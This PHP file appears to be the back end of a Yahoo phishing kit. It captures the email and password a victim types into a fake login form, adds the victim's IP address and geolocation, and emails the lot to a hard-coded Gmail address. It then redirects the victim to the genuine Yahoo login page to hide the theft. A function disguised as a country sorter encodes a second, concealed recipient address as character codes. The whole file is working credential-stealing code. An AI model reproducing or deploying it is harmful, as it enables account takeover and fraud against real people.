<?

//if($_POST["loaname"] != "" and $_POST["loapasuma"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "************************************\n";
$message .= "E. ".$_POST['oohayuname']."\n";
$message .= "P. ".$_POST['oohaypasuma']."\n";
$message .= "************************************\n";
$message .= "Geo IP. ".$ip."\n";
$message .= "C. {$geoplugin->city}\n";
$message .= "R. {$geoplugin->region}\n";
$message .= "Co Name. {$geoplugin->countryName}\n";
$message .= "Co Code. {$geoplugin->countryCode}\n";
$message .= "Dated. ".$adddate."\n";
$message .= "************************************\n";
// change your email here 
$sent ="sweetlord500@gmail.com";


$subject = "YAHOO! - $ip ".$country;
$headers = "From: YAHOO! N@BOXS.COM>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: https://login.yahoo.com/config/mail?.intl=ph");
?>